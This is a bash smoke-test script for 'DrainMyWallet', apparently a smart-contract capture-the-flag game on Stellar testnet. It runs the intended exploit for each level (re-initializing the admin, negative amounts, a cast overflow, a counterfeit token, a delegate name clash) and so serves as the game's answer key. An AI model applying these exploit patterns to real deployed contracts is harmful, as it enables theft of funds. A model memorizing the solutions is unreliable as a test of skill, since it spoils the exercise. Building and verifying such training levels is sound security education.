#!/usr/bin/env bash
# End-to-end check of a live DrainMyWallet deployment. For each level it creates
# a fresh instance, runs the intended exploit from a throwaway key, submits, and
# prints PASS/FAIL. Run it right after scripts/deploy.sh, and again before the
# judges, to prove every level is solvable on the contracts that are actually
# deployed.
#
#   scripts/smoke-test.sh [network] [player-identity]
#   ONLY="1 7 9" scripts/smoke-test.sh testnet me   # a subset
#
# It reads ids from deployments/<network>.env and signs with its own key, so it
# needs a funded testnet account (created and funded here if missing). It never
# touches the game admin or the factory's keys.
#
# Level 5 waits for a temporary ban to expire (about an hour on testnet). It is
# skipped unless WITH_SLOW=1, so a quick run stays quick.
set -euo pipefail

NETWORK="${1:-testnet}"
PLAYER="${2:-dmw-smoke}"
ONLY="${ONLY:-1 2 3 4 5 6 7 8 9}"
WITH_SLOW="${WITH_SLOW:-0}"

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
cd "$ROOT"
ENV_FILE="deployments/$NETWORK.env"
[[ -f "$ENV_FILE" ]] || { echo "missing $ENV_FILE: run scripts/deploy.sh $NETWORK first" >&2; exit 1; }
# shellcheck disable=SC1090
source "$ENV_FILE"

case "$NETWORK" in
  mainnet | public | pubnet) echo "smoke-test is testnet only" >&2; exit 1 ;;
esac

bold=$(tput bold 2>/dev/null || true)
red=$(tput setaf 1 2>/dev/null || true)
green=$(tput setaf 2 2>/dev/null || true)
dim=$(tput setaf 8 2>/dev/null || true)
off=$(tput sgr0 2>/dev/null || true)

log() { printf '\n%s==> %s%s\n' "$bold" "$*" "$off"; }
info() { printf '    %s%s%s\n' "$dim" "$*" "$off"; }

# `stellar <group> <command> <options...>`: the network and key go before the
# caller's options, since those may contain `--` followed by function arguments.
sx() { stellar "$1" "$2" --network "$NETWORK" --source-account "$PLAYER" "${@:3}"; }
# Invoke a contract function and print its result (the last output line). The
# CLI's progress and event lines are dropped on success, shown on failure.
invoke() {
  local out
  if ! out="$(sx contract invoke "$@" 2>&1)"; then
    printf '%s\n' "$out" | tail -6 >&2
    return 1
  fi
  printf '%s\n' "$out" | tail -1
}
unquote() { tr -d '"'; }

# --- identity ---------------------------------------------------------------

if ! stellar keys address "$PLAYER" >/dev/null 2>&1; then
  log "Creating a throwaway player '$PLAYER'"
  stellar keys generate "$PLAYER" --network "$NETWORK" --fund >/dev/null
else
  stellar keys fund "$PLAYER" --network "$NETWORK" >/dev/null 2>&1 || true
fi
ME="$(stellar keys address "$PLAYER")"
info "player $ME"

# LOOT trustline, needed by the payout of levels 1, 2, 6 and 9.
# change-trust is idempotent, so it is safe to send on every run.
stellar tx new change-trust --line "$GAME_ASSET" --network "$NETWORK" \
  --source-account "$PLAYER" >/dev/null 2>&1 || info "could not set the LOOT trustline"

# --- helpers ----------------------------------------------------------------

new_instance() { # level_id -> address
  invoke --id "$FACTORY_ID" -- new_instance --player "$ME" --level_id "$1" | unquote
}

submit() { # level_id -> "true"/"false"
  invoke --id "$FACTORY_ID" -- submit --player "$ME" --level_id "$1" | unquote
}

PASS=0
FAIL=0
SKIP=0
RESULTS=""

record() { # level name outcome detail
  local mark
  case "$3" in
    PASS) mark="${green}PASS${off}"; PASS=$((PASS + 1)) ;;
    FAIL) mark="${red}FAIL${off}"; FAIL=$((FAIL + 1)) ;;
    SKIP) mark="${dim}SKIP${off}"; SKIP=$((SKIP + 1)) ;;
  esac
  RESULTS="$RESULTS$(printf '  %-2s %-16s %s %s' "$1" "$2" "$mark" "${4:-}")"$'\n'
}

# Each level: create, exploit, submit, and report whether submit returned true.
# The exploit commands mirror SOLUTIONS.md on the `solutions` branch.

run_level() { # level_id name exploit_fn
  local id="$1" name="$2" fn="$3"
  log "Level $id — $name"
  local inst
  inst="$(new_instance "$id")"
  info "instance $inst"
  if ! "$fn" "$inst"; then
    record "$id" "$name" FAIL "(exploit errored)"
    return
  fi
  local solved
  solved="$(submit "$id")"
  if [[ "$solved" == "true" ]]; then
    record "$id" "$name" PASS
  else
    record "$id" "$name" FAIL "(submit returned $solved)"
  fi
}

# --- exploits ---------------------------------------------------------------

x1() { invoke --id "$1" -- withdraw --to "$ME" --amount 10000000000 >/dev/null; }

x2() {
  invoke --id "$1" -- initialize --admin "$ME" >/dev/null
  invoke --id "$1" -- sweep --to "$ME" >/dev/null
}

x3() { invoke --id "$1" -- withdraw_for --caller "$ME" --account "$1" --amount 1000 >/dev/null; }

x4() { invoke --id "$1" -- claim_reward --player "$ME" --amount 4294967297 >/dev/null; }

x5() {
  local banned
  banned="$(invoke --id "$1" --send=no -- is_banned --member "$ME" | unquote)"
  info "ban active, waiting for the temporary entry to expire (about an hour)"
  while [[ "$banned" == "true" ]]; do
    sleep 60
    banned="$(invoke --id "$1" --send=no -- is_banned --member "$ME" | unquote)"
  done
  invoke --id "$1" -- claim --member "$ME" >/dev/null
}

x6() {
  local dir="$ROOT/attackers/level-06-fake-token"
  local wasm="$dir/target/wasm32v1-none/release/fake_token.wasm"
  info "building the counterfeit token"
  (cd "$dir" && stellar contract build >/dev/null 2>&1)
  local fake
  fake="$(sx contract deploy --wasm "$wasm" 2>/dev/null | tail -1 | unquote)"
  info "fake token $fake"
  invoke --id "$1" -- deposit --token "$fake" --from "$ME" --amount 10000000000 >/dev/null
  invoke --id "$1" -- withdraw --to "$ME" --amount 10000000000 >/dev/null
}

x7() { invoke --id "$1" -- send --from "$ME" --to "$1" --amount=-1000 >/dev/null; }

x8() { invoke --id "$1" -- add_delegate --caller "$ME" --name admin --who "$ME" >/dev/null; }

x9() { invoke --id "$1" -- withdraw --to "$ME" >/dev/null; }

# A function rather than an associative array: macOS ships bash 3.2.
name_of() {
  case "$1" in
    1) echo "Open Door" ;;
    2) echo "Crown" ;;
    3) echo "Wrong Signer" ;;
    4) echo "Fatal Cast" ;;
    5) echo "Forgetful List" ;;
    6) echo "Counterfeit" ;;
    7) echo "Negative Space" ;;
    8) echo "Name Clash" ;;
    9) echo "Time Warp" ;;
    *) echo "unknown level $1" >&2; return 1 ;;
  esac
}

for id in $ONLY; do
  if [[ "$id" == 5 && "$WITH_SLOW" != 1 ]]; then
    log "Level 5 — Forgetful List"
    info "skipped (waits about an hour). Run WITH_SLOW=1 to include it."
    record 5 "Forgetful List" SKIP "(set WITH_SLOW=1)"
    continue
  fi
  run_level "$id" "$(name_of "$id")" "x$id"
done

# --- summary ----------------------------------------------------------------

log "Summary"
printf '%s' "$RESULTS"
printf '\n  %s%d passed%s, %s%d failed%s, %d skipped\n' \
  "$green" "$PASS" "$off" "$red" "$FAIL" "$off" "$SKIP"
[[ "$FAIL" -eq 0 ]]
